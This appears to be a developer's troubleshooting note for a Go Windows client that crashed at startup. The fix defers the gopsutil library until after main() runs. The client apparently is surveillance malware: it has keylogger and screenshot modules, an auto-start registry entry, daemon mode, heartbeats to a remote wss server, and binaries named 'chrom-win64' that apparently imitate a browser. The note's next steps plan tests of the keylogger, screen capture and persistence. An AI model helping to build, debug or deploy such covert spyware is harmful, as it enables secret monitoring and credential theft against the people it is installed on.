# Windows Crash Fix v2 - Package Init Issue

## Problem
Client crashed **before any code executed** (even `-h` flag):
```
Exception 0xc0000005 0x8 0x0 0x0
PC=0x0
```

## Root Cause
**gopsutil package initialization** on Windows:
- `github.com/shirou/gopsutil/v3/host` was imported in `machine_id_windows.go`
- `gopsutil` calls Windows WMI/COM APIs during package `init()`
- These APIs failed before Go runtime was fully initialized
- Crash occurred before `main()` function executed

## Solution Applied

### 1. Removed gopsutil from Machine ID Generation
**File: `client/machine_id_windows.go`**
- ❌ Removed: `import "github.com/shirou/gopsutil/v3/host"`
- ✅ Now uses: Windows Registry `MachineGuid` + hostname only
- No external dependencies that call Windows APIs at init time

### 2. Moved gopsutil to Lazy-Loaded Stats
**Files Created:**
- `client/system_stats_windows.go` - Windows stats with panic recovery
- `client/system_stats_unix.go` - Unix/Linux/Mac stats

**Changes:**
- gopsutil imports moved to platform-specific files
- Stats collection happens ONLY when heartbeat runs (after main())
- Each gopsutil call wrapped in panic recovery
- Graceful fallback if stats collection fails

### 3. Comprehensive Debug Logging
- Debug messages at every initialization step
- Panic recovery with 30-second delay for log review
- Shows exact failure point

## New Builds

### Test These First (v2 builds)
```
bin/chrom-win64-v2.exe         (6.7MB) - Release 64-bit
bin/chrom-win32-v2.exe         (6.5MB) - Release 32-bit  
bin/chrom-win64-debug-v2.exe   (11MB)  - Debug with full logging
```

### Also Available
```
bin/test-minimal.exe (2.4MB) - Minimal test (just prints "Hello")
```

## Testing Steps

### 1. Test Minimal Build (Verify Go Runtime Works)
```powershell
.\test-minimal.exe
```
**Expected:** Should print "Minimal client started!" and wait for Enter.

### 2. Test v2 Debug Build
```powershell
.\chrom-win64-debug-v2.exe -h
```
**Expected:** Should show help text, NOT crash

```powershell
.\chrom-win64-debug-v2.exe -daemon=false
```
**Expected:** Debug messages showing initialization steps

### 3. Test v2 Release Build
```powershell
.\chrom-win64-v2.exe -server wss://yourserver.com/ws -daemon=false
```

## What Changed

### Before (Broken)
```
Package init → gopsutil.host.Info() → WMI/COM → CRASH
```

### After (Fixed)
```
Package init → No Windows APIs called → main() executes
  ↓
main() → Create components → All safe
  ↓  
Heartbeat (30s later) → gopsutil stats (with panic recovery)
```

## Technical Details

**gopsutil Issue:**
- On Windows, gopsutil/host uses WMI (Windows Management Instrumentation)
- WMI initialization can fail if:
  - COM not properly initialized
  - Running in restricted environment
  - Antivirus interference
  - Windows services not ready

**Our Fix:**
- Removed gopsutil from package-level imports in critical paths
- Machine ID now uses only: hostname + Registry MachineGuid
- System stats collection deferred until after client starts
- All stats calls wrapped in panic recovery

## Files Modified

1. `client/machine_id_windows.go` - Removed gopsutil import
2. `client/main.go` - Removed direct gopsutil imports
3. `client/system_stats_windows.go` (NEW) - Safe stats collection
4. `client/system_stats_unix.go` (NEW) - Unix stats collection
5. `client/keylogger_windows.go` - Added DLL init debugging
6. `client/screenshot_windows.go` - Added DLL init debugging

## Comparison

| Version | gopsutil Init | Machine ID Source | Crash Risk |
|---------|---------------|-------------------|------------|
| Old | Package init | gopsutil.host.Info() | HIGH |
| v2 | Deferred | Registry + hostname | LOW |

## If Still Crashes

1. **Try minimal test first:**
   ```powershell
   .\test-minimal.exe
   ```
   If this crashes → Go compiler/Windows version incompatibility

2. **Check debug output:**
   ```powershell
   .\chrom-win64-debug-v2.exe -daemon=false > log.txt 2>&1
   ```
   Last line shows where it fails

3. **Check Windows version:**
   ```powershell
   winver
   systeminfo | findstr /C:"OS"
   ```

4. **Try 32-bit version:**
   ```powershell
   .\chrom-win32-v2.exe -daemon=false
   ```

## Success Indicators

✅ Program should now:
- Start without immediate crash
- Show debug messages (debug build)
- Respond to `-h` flag
- Create machine-id cache file
- Retry connection attempts

## Next Steps After Success

1. Test with actual server connection
2. Test screenshot capture (requires GUI session)
3. Test keylogger (requires admin privileges)
4. Test auto-start registry entry
5. Test daemon mode

## Build Commands

```bash
# Debug builds
GOOS=windows GOARCH=amd64 go build -gcflags="all=-N -l" -o bin/chrom-win64-debug-v2.exe ./cmd/client
GOOS=windows GOARCH=386 go build -gcflags="all=-N -l" -o bin/chrom-win32-debug-v2.exe ./cmd/client

# Release builds
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o bin/chrom-win64-v2.exe ./cmd/client
GOOS=windows GOARCH=386 go build -ldflags="-s -w" -o bin/chrom-win32-v2.exe ./cmd/client

# Minimal test
GOOS=windows GOARCH=amd64 go build -o bin/test-minimal.exe ./cmd/client-minimal
```
